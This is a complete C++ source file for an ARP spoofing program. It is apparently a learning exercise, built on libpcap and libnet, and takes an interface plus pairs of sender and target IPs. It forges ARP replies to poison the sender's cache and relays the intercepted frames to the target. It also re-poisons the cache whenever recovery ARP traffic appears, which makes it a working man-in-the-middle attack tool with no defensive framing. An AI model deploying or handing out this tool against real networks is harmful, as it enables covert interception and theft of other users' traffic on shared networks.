#include <cstdlib>
#include <stdio.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <string.h>
#include <arpa/inet.h>
#include <stdint.h>
#include <libnet.h>
#include <pcap.h>
#include <thread>
#include "ether_arp.h"
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>
#define IP_ADDR_LEN 4

char *dev;
void dump(const uint8_t *p, int len){
    for(int i = 0 ; i < len ; i++){
        printf("%02X ", p[i]);
        if(len % 16 == 15) printf("\n");
    }
    printf("\n");
}

uint8_t *get_ip_address(char *interface, uint8_t *ip)
{
    struct ifreq ifr;
    char ipstr[40];
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, interface, IFNAMSIZ);

    if(ioctl(fd, SIOCGIFADDR, &ifr) < 0) {
        printf("Error");
    }else{
        memcpy(ip, ifr.ifr_addr.sa_data + 2, 4);
        //inet_ntop(AF_INET, ifr.ifr_addr.sa_data + 2, (char *)ip, sizeof(struct sockaddr));
    }
    close(fd);
    return ip;
}

void get_mac_address(char *interface, uint8_t *mac){
    struct ifreq ifr;
    int fd = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);
    ioctl(fd, SIOCGIFHWADDR, &ifr);
    close(fd);
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
    //printf("MAC : %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

void send_arp_packet(pcap_t *handle, uint8_t *src_mac_adr, uint8_t *src_ip_adr, uint8_t *dst_mac_adr, uint8_t *dst_ip_adr, uint16_t op_code){
    ethernet_arp packet;

    //fill the ethernet header
    memcpy(packet.eth_hdr.ether_dhost , dst_mac_adr, 6);
    memcpy(packet.eth_hdr.ether_shost, src_mac_adr, 6);
    packet.eth_hdr.ether_type = htons(ETHERTYPE_ARP);

    //fill the ARP header
    packet.arp_hdr.ar_hrd = htons(ARPHRD_ETHER);
    packet.arp_hdr.ar_pro = htons(ETHERTYPE_IP);
    packet.arp_hdr.ar_hln = ETHER_ADDR_LEN;
    packet.arp_hdr.ar_pln = IP_ADDR_LEN;
    packet.arp_hdr.ar_op = htons(op_code);

    //fill the ARP DATA
    memcpy(packet.sdr_hardware_adr, src_mac_adr, 6);
    memcpy(packet.sdr_protocol_adr, src_ip_adr, 4);

    int ck_broadcast_mac = 1;
    for(int i = 0 ; i < 6 ; i++) if(dst_mac_adr[i] != 0xff) ck_broadcast_mac = 0;
    if(ck_broadcast_mac) for(int i = 0 ; i < 6 ; i++) packet.trg_hardware_adr[i] = 0x00;
    else memcpy(packet.trg_hardware_adr, dst_mac_adr, 6);  
    
    memcpy(packet.trg_protocol_adr, dst_ip_adr, 4);

    pcap_sendpacket(handle, (const u_char *)&packet, sizeof(ethernet_arp));
}

bool check_packet(const u_char *p, int len, uint8_t *atk_mac_adr, uint8_t *atk_ip_adr, uint8_t *sdr_ip_adr){
    const ethernet_arp *pos = (const ethernet_arp *)p;

    if(memcmp(pos->eth_hdr.ether_dhost, atk_mac_adr, 6)) return false;

    if(ntohs(pos->eth_hdr.ether_type) != ETHERTYPE_ARP) return false;

    if(ntohs(pos->arp_hdr.ar_hrd) != ARPHRD_ETHER) return false;
 
    if(ntohs(pos->arp_hdr.ar_pro) != ETHERTYPE_IP) return false;

    if((pos->arp_hdr.ar_hln) != 0x06) return false;

    if((pos->arp_hdr.ar_pln) != 0x04) return false;

    if(ntohs(pos->arp_hdr.ar_op) != ARPOP_REPLY) return false;

    if((*(uint32_t *)(pos->sdr_protocol_adr)) != (*(uint32_t *)sdr_ip_adr)) return false;

    if(memcmp(pos->trg_hardware_adr, atk_mac_adr, 6)) return false;

    if((*(uint32_t *)(pos->trg_protocol_adr)) != (*(uint32_t *)atk_ip_adr)) return false;

    return true;
}

void receive_arp_packet(pcap_t *handle, uint8_t *atk_mac_adr, uint8_t *atk_ip_adr, uint8_t *sdr_mac_adr, uint8_t *sdr_ip_adr){
    while(true){
        struct pcap_pkthdr *header;
        const u_char *packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if(res == 0) continue;
        if(res == -1 || res == -2) break;
        if(check_packet(packet, header->caplen, atk_mac_adr, atk_ip_adr, sdr_ip_adr)){
            memcpy(sdr_mac_adr, packet + 6, 6);
            break;
        }
    }
}

void print_mac_adr(uint8_t *mac_adr){
    printf("MY MAC Address: ");
    for(int i = 0 ; i < 6 ; i++) {
        if(i) printf(":");
        printf("%.2X", mac_adr[i]);
    }
    printf("\n");
}

void print_ip_adr(uint8_t *ip_adr){
    printf("MY IP Address : ");
    for(int i = 0 ; i < 4 ; i++){
        if(i) printf(".");
        printf("%.2d", ip_adr[i]);
    }
    printf("\n");
}

bool is_sender_packet(const u_char *p, uint8_t *sdr_mac_adr){
    if(memcmp(((struct libnet_ethernet_hdr *)p)->ether_shost, sdr_mac_adr, 6)) return false;
    return true;
}

bool is_recovery_packet(pcap_t *handle, const u_char *p, uint8_t *atk_mac_adr, uint8_t *trg_ip_adr){
    if(memcmp(((struct libnet_ethernet_hdr *)p)->ether_dhost, "ffffff", 6) && memcmp(((struct libnet_ethernet_hdr *)p)->ether_dhost, atk_mac_adr, 6)) return false;
    if(ntohs(((struct libnet_ethernet_hdr *)p)->ether_type) != ETHERTYPE_ARP) return false;

    const ethernet_arp *eth_arp = (const ethernet_arp *)p;
    if(ntohs(eth_arp->arp_hdr.ar_hrd) != ARPHRD_ETHER) return false;
    if(ntohs(eth_arp->arp_hdr.ar_pro) != ETHERTYPE_IP) return false;
    if(*(uint32_t *)(eth_arp->trg_protocol_adr) != *(uint32_t *)(trg_ip_adr)) return false;
    
    return true;
}

bool is_target_arp_packet(const u_char *p, uint8_t *trg_mac_adr){
    if(memcmp(((struct libnet_ethernet_hdr *)p)->ether_shost, trg_mac_adr, 6)) return false;
    return true;
}

void arp_spoof(pcap_t *handle, uint8_t *atk_mac_adr, uint8_t *atk_ip_adr, uint8_t *sdr_mac_adr, uint8_t *sdr_ip_adr, uint8_t *trg_mac_adr, uint8_t *trg_ip_adr){    
    while(true){
        struct pcap_pkthdr *header;
        const u_char *packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if(res == 0) continue;
        if(res == -1 || res == -2) break;
        //printf("%u bytes captured\n", header->caplen);
        if(is_sender_packet(packet, sdr_mac_adr)) {
            if(is_recovery_packet(handle, packet, atk_mac_adr, trg_ip_adr)) send_arp_packet(handle, atk_mac_adr, trg_ip_adr, sdr_mac_adr, sdr_ip_adr, ARPOP_REPLY);
            else {
                u_char *tmp_packet = (u_char *)malloc(header->caplen);
                memcpy(tmp_packet, packet, header->caplen);
                memcpy(((libnet_ethernet_hdr *)tmp_packet)->ether_shost, atk_mac_adr, 6);
                memcpy(((libnet_ethernet_hdr *)tmp_packet)->ether_dhost, trg_mac_adr, 6);
                pcap_sendpacket(handle, tmp_packet, header->caplen);
            } 
        }
        else if(is_target_arp_packet(packet, trg_mac_adr)) send_arp_packet(handle, atk_mac_adr, trg_ip_adr, sdr_mac_adr, sdr_ip_adr, ARPOP_REPLY);
    }
}

void arp_spoof_session(char **raw_ip){
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if(handle == NULL){
        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
        exit(-1);
    }
    
    uint8_t *atk_mac_adr = (uint8_t *)malloc(6);
    uint8_t *atk_ip_adr = (uint8_t *)malloc(4);
    uint8_t *sdr_mac_adr = (uint8_t *)malloc(6);
    uint8_t *sdr_ip_adr = (uint8_t *)malloc(4);
    uint8_t *trg_mac_adr = (uint8_t *)malloc(6);
    uint8_t *trg_ip_adr = (uint8_t *)malloc(4);

    get_mac_address(dev, atk_mac_adr);
    get_ip_address(dev, atk_ip_adr);

    for(int i = 0 ; i < 6 ; i++) sdr_mac_adr[i] = 0xff, trg_mac_adr[i] = 0xff;
    
    sscanf(raw_ip[0], "%d.%d.%d.%d", &sdr_ip_adr[0], &sdr_ip_adr[1], &sdr_ip_adr[2], &sdr_ip_adr[3]);
    sscanf(raw_ip[1], "%d.%d.%d.%d", &trg_ip_adr[0], &trg_ip_adr[1], &trg_ip_adr[2], &trg_ip_adr[3]);

    send_arp_packet(handle, atk_mac_adr, atk_ip_adr, trg_mac_adr, trg_ip_adr, ARPOP_REQUEST);
    receive_arp_packet(handle, atk_mac_adr, atk_ip_adr, trg_mac_adr, trg_ip_adr);

    send_arp_packet(handle, atk_mac_adr, atk_ip_adr, sdr_mac_adr, sdr_ip_adr, ARPOP_REQUEST);
    receive_arp_packet(handle, atk_mac_adr, atk_ip_adr, sdr_mac_adr, sdr_ip_adr);
    send_arp_packet(handle, atk_mac_adr, trg_ip_adr, sdr_mac_adr, sdr_ip_adr, ARPOP_REPLY);
    
    arp_spoof(handle, atk_mac_adr, atk_ip_adr, sdr_mac_adr, sdr_ip_adr, trg_mac_adr, trg_ip_adr);
}

void usage(){
    printf("syntax : arp_spoof <interface> <sender ip 1> <target ip 1> [<sender ip2> <target ip 2>...]\n");
    exit(-1);
}

int main(int argc, char **argv){
    dev = argv[1];
    if(argc < 4 || (argc & 1)) usage();

    pid_t pid;
    for(int i = 2; i < argc ; i += 2){
        pid_t pid = fork();
        if(pid == 0) {
            arp_spoof_session(argv + i);
            return 0;
        }
    }

    int status;
    for(int i= 2 ; i < argc ; i +=2) wait(&status);

    return 0;
}